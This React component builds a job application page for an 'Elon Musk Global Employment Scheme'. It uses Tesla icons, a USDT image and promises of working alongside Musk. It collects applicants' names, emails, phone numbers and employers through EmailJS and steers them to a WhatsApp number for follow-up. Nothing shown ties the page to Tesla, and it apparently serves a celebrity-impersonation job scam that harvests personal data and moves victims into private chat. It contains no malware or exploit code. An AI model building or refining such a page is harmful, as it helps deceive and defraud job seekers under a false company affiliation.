import "./Formemployment.css";
import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import Nav from "./Nav";

import tgima from "../assets/tgima.png";
import aihand from "../assets/aihand.png";
import te from "../assets/te.png";
import gozie from "../assets/gozie.png";
import whapp from "../assets/whapp.jpg";
import ussdt from "../assets/ussdt.png";
import { CircularProgress } from "@mui/material"; // ✅ added

export default function EmploymentForm() {
  const form = useRef();

  const [countryCode, setCountryCode] = useState("");
  const [mode, setMode] = useState("glass");
  const [sending, setSending] = useState(false);
  const [sent, setSent] = useState(false);

  // ✅ WhatsApp message (safe + fixed)
  const message = encodeURIComponent(
    "Hello, I just submitted an employment application. Please send more details."
  );

  const sendEmail = (e) => {
    e.preventDefault();

    // ✅ ALERT ON SUBMIT CLICK
    alert("Your application is being submitted. Please wait...");

    const now = new Date();
    form.current.date.value = now.toLocaleDateString();
    form.current.time.value = now.toLocaleTimeString();

    setSending(true);

    emailjs
      .sendForm(
        import.meta.env.VITE_EMAILJS_SERVICE_ID,
        import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
        form.current,
        import.meta.env.VITE_EMAILJS_PUBLIC_KEY
      )
      .then(
        () => {
          setSending(false);
          setSent(true);
          form.current.reset();
          setCountryCode("");

          alert("Application submitted successfully ✔");

          setTimeout(() => setSent(false), 3000);
        },
        () => {
          setSending(false);
          alert("Error sending application. Please try again.");
        }
      );
  };

  const containerStyle =
    mode === "glass"
      ? "backdrop-blur-xl bg-white/20 border border-white/30 shadow-2xl"
      : "bg-white border shadow";

  return (
    <>
    <Nav/>

    <div className="form">
      <div className="Header">
        <h1>Employment Application</h1>

        <div className="flexrounded-lg">
          <img src={tgima} alt="Tesla Icon" className="w-10" />
          <img src={aihand} alt="AI Icon" className="w-11" />
        </div>
      </div>

      <div className={`rounded-2xl p-8 ${containerStyle}`}>
        <div className="form-mom">
          <h3>Add Your Contact Information</h3>
          <p>
            Kindly fill out the form with your experience and contact details.
            A team member will follow up shortly.
          </p>
        </div>

        <div className="display">
          <div className="formone">
            <form ref={form} onSubmit={sendEmail}>
              <div className="save">
                <img src={te} alt="Tesla Icon" />
              </div>

              <div className="inputA">
                <label>Full Name:</label><br />
                <input type="text" name="full_name" required />
              </div>

              <div className="inputB">
                <label>Email Address:</label><br />
                <input type="email" name="email" required />
              </div>

              <div className="inputC">
                <label>Phone Number:</label><br />
                <input type="text" name="phone" />
              </div>

              <div className="inputD">
                <label>Country:</label><br />
                <select
                  name="country_code"
                  value={countryCode}
                  onChange={(e) => setCountryCode(e.target.value)}
                >
                   <option value=""></option>
                 <option value="+1">United States</option>
                 <option value="+1">Canada</option>
                 <option value="+52">Mexico</option>
                 <option value="+44">United Kingdom</option>
                 <option value="+33">France</option>
                 <option value="+49">Germany</option>
                 <option value="+39">Italy</option>
                 <option value="+55">Brazil</option>
                 <option value="+54">Argentina</option>
                 <option value="+56">Chile</option>
                 <option value="+86">China</option>
                 <option value="+81">Japan</option>
                 <option value="+91">India</option>
                 <option value="+82">South Korea</option>
                 <option value="+966">Saudi Arabia</option>
                 <option value="+971">UAE</option>
                 <option value="+974">Qatar</option>
                 <option value="+61">Australia</option>
                 <option value="+64">New Zealand</option>
                 <option value="+972">Israel</option>
                 <option value="+299">Greenland</option>
                 <option value="+30">Greece</option>
                 <option value="+358">Finland</option>
                 <option value="+354">Iceland</option>
                 <option value="+977">Nepal</option>
                 <option value="+48">Poland</option>
                 <option value="+46">Sweden</option>
                </select>
              </div>

              <div className="inputE">
                <label>Company / School:</label><br />
                <input type="text" name="org_name" />
              </div>

              <div className="inputF">
                <label>Position / Grade:</label><br />
                <input type="text" name="position_grade" />
              </div>

              <div className="inputG">
                <textarea
                  name="special_requests"
                  rows={4}
                  placeholder="Special Requests / Notes"
                ></textarea>
              </div>

              {/* Hidden fields for EmailJS */}
              <input type="hidden" name="date" />
              <input type="hidden" name="time" />

              <div className="formsubmit">
                <button
                  type="submit"
                  disabled={sending}
                  style={{ display: "flex", alignItems: "center", gap: "10px" }}
                >
                  {sending && <CircularProgress size={20} color="inherit" />}
                  {sending ? "Sending..." : "Submit Application"}
                </button>

                {sent && (
                  <p className="text-green-600 mt-2">
                    Application sent successfully ✔
                  </p>
                )}
              </div>
            </form>
          </div>

          <div className="formtwo">
            <h4>Elon Musk Global Employment Scheme</h4>
            <p>
             By completing this application, you take the first step toward joining a mission-driven network of innovators, engineers, creators, and forward-thinkers working alongside Elon Musk to redefine the boundaries of technology, accelerate google progress, and build solutions that will shape the future of energy, transportation, space exploration, and human advancement for generations to come.
            </p>
          </div>

          <div className="imgtela">
            <img src={gozie} alt="Profile" />
            <div className="ussdt">
              <img src={ussdt} alt="USSDT" />
            </div>
          </div>
        </div>

        <div className="Bycompleting">
          <img src={te} alt="Tesla Icon" />
          <a
            href={`https://wa.me/+14796524016?text=${message}`}
            target="_blank"
            rel="noreferrer"
          >
            <img src={whapp} alt="WhatsApp" className="w-8" />
          </a>
        </div>

        <div className="havingtt">
          <h4>
            Having an issue? <a href="https://wa.me/+14796524016">Tell us more</a>
          </h4>

          <div className="marquee">
           <marquee>Across industries and borders, this program is shaping the future of work by providing access to meaningful opportunities, fostering professional growth, and driving innovation on a global scale</marquee>

          </div>
        </div>
      </div>
    </div>
    </>
  );
}